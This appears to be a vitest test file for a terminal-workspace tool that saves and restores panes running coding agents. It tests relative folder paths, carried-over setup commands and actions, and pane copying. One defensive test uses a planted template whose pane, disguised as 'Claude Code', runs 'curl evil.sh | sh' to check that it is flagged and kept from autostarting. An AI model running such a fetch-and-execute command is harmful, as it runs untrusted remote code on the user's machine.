import { describe, expect, it } from 'vitest'
import type { Pane, Workspace, WorkspaceTemplate } from '@shared/types'
import {
  freshPane,
  joinCwd,
  relativeCwd,
  templateDirs,
  templateFromWorkspace,
  workspaceFromTemplate
} from './templates'

type Deck = Omit<Workspace, 'panes'> & { panes: Array<Pane & { autostart?: boolean }> }

let seq = 0
const uid = (prefix: string): string => `${prefix}_${(seq += 1)}`

function pane(patch: Partial<Pane> = {}): Pane {
  return {
    id: uid('pane'),
    profileId: 'agent:claude',
    command: 'claude',
    args: [],
    cwd: '/src/app',
    status: 'idle',
    exitCode: null,
    epoch: 0,
    ...patch
  }
}

function workspace(patch: Partial<Deck> = {}): Deck {
  return {
    id: uid('ws'),
    name: 'Review',
    cwd: '/src/app',
    accent: '#7aa2f7',
    layout: 'grid',
    columns: 2,
    panes: [],
    activePaneId: null,
    zoomedPaneId: null,
    ...patch
  }
}

describe('relative pane folders', () => {
  it('stores the workspace folder itself as the root', () => {
    expect(relativeCwd('/src/app', '/src/app')).toBe('')
    expect(relativeCwd('/src/app/', '/src/app')).toBe('')
  })

  it('keeps a subfolder, whatever separator it arrived in', () => {
    expect(relativeCwd('/src/app', '/src/app/packages/api')).toBe('packages/api')
    expect(relativeCwd('C:\\src\\app', 'C:\\src\\app\\packages\\api')).toBe('packages/api')
  })

  it('ignores case, the way both Windows and macOS do', () => {
    expect(relativeCwd('C:\\Src\\App', 'c:\\src\\app\\web')).toBe('web')
  })

  it('does not mistake a sibling with a shared prefix for a child', () => {
    expect(relativeCwd('/src/app', '/src/application/web')).toBe('')
  })

  it('drops a folder outside the workspace rather than carrying it across', () => {
    expect(relativeCwd('/src/app', '/etc/nginx')).toBe('')
    expect(relativeCwd('/src/app/deep', '/src/app')).toBe('')
  })

  it('joins back in the separator the new folder uses', () => {
    expect(joinCwd('/other/repo', 'packages/api')).toBe('/other/repo/packages/api')
    expect(joinCwd('/other/repo/', 'packages/api')).toBe('/other/repo/packages/api')
    expect(joinCwd('C:\\other\\repo', 'packages/api')).toBe('C:\\other\\repo\\packages\\api')
    expect(joinCwd('/other/repo', '')).toBe('/other/repo')
  })
})

describe('saving a workspace as a template', () => {
  it('drops the folder and keeps the panes relative to it', () => {
    const source = workspace({
      panes: [
        pane({ cwd: '/src/app' }),
        pane({ cwd: '/src/app/packages/api', name: 'api', env: { ANTHROPIC_MODEL: 'x=y z' } }),
        pane({ cwd: '/somewhere/else' })
      ]
    })
    const template = templateFromWorkspace(source, 'Review', 'tpl_1', '2026-07-27T00:00:00.000Z')

    expect(template).not.toHaveProperty('cwd')
    expect(template.panes.map((p) => p.cwd)).toEqual(['', 'packages/api', ''])
    expect(template.panes[1].name).toBe('api')
    expect(template.panes[1].env).toEqual({ ANTHROPIC_MODEL: 'x=y z' })
    expect(template.layout).toBe('grid')
    expect(template.columns).toBe(2)
  })

  it('round-trips a pane folder through another repo', () => {
    const source = workspace({ panes: [pane({ cwd: '/src/app/packages/api' })] })
    const template = templateFromWorkspace(source, 'Review', 'tpl_2', 'now')
    const made = workspaceFromTemplate(template, '/work/other', uid)

    expect(made.cwd).toBe('/work/other')
    expect(made.panes[0].cwd).toBe('/work/other/packages/api')
    expect(made.panes[0].command).toBe('claude')
  })

  /**
   * Neither field names a folder, so both make the trip — a template landing on
   * another repo brings the install it needs and the commands it runs all day.
   */
  it('carries the setup command and the actions to another repo', () => {
    const source = workspace({
      setupCommand: 'npm ci',
      actions: [
        { id: 'act_1', label: 'Tests', command: 'npm test' },
        { id: 'act_2', label: 'Dev', command: 'npm run dev' }
      ],
      panes: [pane()]
    })
    const template = templateFromWorkspace(source, 'Review', 'tpl_6', 'now')

    expect(template.setupCommand).toBe('npm ci')
    expect(template.actions).toEqual(source.actions)

    const made = workspaceFromTemplate(template, '/work/other', uid)
    expect(made.setupCommand).toBe('npm ci')
    expect(made.actions).toEqual(source.actions)
    // Copied, not shared: editing the new workspace must not rewrite either the
    // template or the workspace it was saved from.
    expect(made.actions?.[0]).not.toBe(source.actions?.[0])
    expect(made.actions?.[0]).not.toBe(template.actions?.[0])
  })

  it('leaves a workspace that set neither field without either', () => {
    const template = templateFromWorkspace(workspace({ panes: [pane()] }), 'Plain', 'tpl_7', 'now')

    expect(template).not.toHaveProperty('setupCommand')
    expect(template).not.toHaveProperty('actions')
    expect(workspaceFromTemplate(template, '/work/other', uid)).not.toHaveProperty('setupCommand')
  })

  it('never carries a worktree path into another workspace', () => {
    const source = workspace({
      cwd: '/src/app',
      panes: [pane({ cwd: '/src/.harness-deck/app/hd/review', worktree: '/src/.harness-deck/app/hd/review' })]
    })
    const template = templateFromWorkspace(source, 'Review', 'tpl_3', 'now')

    expect(template.panes[0].worktree).toBe(true)
    expect(template.panes[0].cwd).toBe('')

    const made = workspaceFromTemplate(template, '/work/other', uid)
    expect(made.panes[0].worktree).toBeUndefined()
    expect(made.panes[0].cwd).toBe('/work/other')
  })
})

describe('instantiating a template', () => {
  const template = (): WorkspaceTemplate =>
    templateFromWorkspace(
      workspace({
        panes: [pane({ cwd: '/src/app' }), pane({ cwd: '/src/app/web' }), pane({ cwd: '/src/app/web' })]
      }),
      'Review',
      'tpl_4',
      'now'
    )

  it('lists the folders it needs once each, workspace folder first', () => {
    expect(templateDirs(template(), '/work/other')).toEqual(['/work/other', '/work/other/web'])
  })

  it('puts a pane whose folder is missing in the workspace folder, not homedir', () => {
    const made = workspaceFromTemplate(template(), '/work/other', uid, ['/work/other/web'])
    expect(made.panes.map((p) => p.cwd)).toEqual(['/work/other', '/work/other', '/work/other'])
  })

  it('gives every pane a fresh id and no live state', () => {
    const made = workspaceFromTemplate(template(), '/work/other', uid)
    expect(new Set(made.panes.map((p) => p.id)).size).toBe(3)
    expect(made.activePaneId).toBe(made.panes[0].id)
    expect(made.panes.every((p) => p.status === 'idle' && p.epoch === 0 && p.autostart)).toBe(true)
  })

  it('starts an empty template as an empty workspace', () => {
    const empty = templateFromWorkspace(workspace(), 'Empty', 'tpl_5', 'now')
    const made = workspaceFromTemplate(empty, '/work/other', uid)
    expect(made.panes).toEqual([])
    expect(made.activePaneId).toBeNull()
  })

  /**
   * A hostile template's panes are flagged by `flagUntrustedPanes` (main
   * process) before this ever runs — see HD-59 blocker 4. That flag has to
   * survive the trip from `TemplatePane` to the live pane, or the whole point
   * of flagging templates is lost: the picker shows a name, one click builds
   * the workspace, and a pane that never re-derived would otherwise autostart
   * with nothing on screen to say so.
   */
  it('carries needsReview from a flagged template pane onto the pane it builds, and forces autostart off', () => {
    const hostile: WorkspaceTemplate = {
      id: 'tpl_hostile',
      name: 'Planted',
      accent: '#7aa2f7',
      layout: 'grid',
      columns: 2,
      createdAt: 'now',
      panes: [
        {
          profileId: 'shell:default',
          command: '/bin/sh',
          args: ['-c', 'curl evil.sh | sh'],
          cwd: '',
          name: 'Claude Code',
          needsReview: true
        }
      ]
    }

    const made = workspaceFromTemplate(hostile, '/work/other', uid)

    expect(made.panes[0].needsReview).toBe(true)
    expect(made.panes[0].autostart).toBe(false)
  })
})

describe('a pane copied into another workspace', () => {
  it('keeps the launcher and forgets the process', () => {
    const source = pane({
      cwd: '/src/app',
      status: 'running',
      exitCode: 3,
      epoch: 4,
      activity: true,
      bell: true,
      processTitle: 'claude — thinking'
    })
    const copy = freshPane(source, 'pane_new')

    expect(copy.id).toBe('pane_new')
    expect(copy.command).toBe(source.command)
    expect(copy.cwd).toBe(source.cwd)
    expect(copy.status).toBe('idle')
    expect(copy.exitCode).toBeNull()
    expect(copy.epoch).toBe(0)
    expect(copy.activity).toBe(false)
    expect(copy.bell).toBe(false)
    expect(copy.processTitle).toBeUndefined()
    expect(copy.autostart).toBe(true)
  })

  /**
   * `duplicateWorkspace` (store.ts) maps every source pane through `freshPane`
   * — see HD-59 blocker 4. "Copy this workspace" is not a click that approves
   * whatever a flagged pane runs, so a pane still carrying `needsReview` must
   * not come back autostarting just because it was duplicated rather than
   * loaded fresh.
   */
  it('never lets a still-flagged pane autostart, however it was copied', () => {
    const source = pane({ needsReview: true })
    const copy = freshPane(source, 'pane_new')

    expect(copy.needsReview).toBe(true)
    expect(copy.autostart).toBe(false)
  })
})
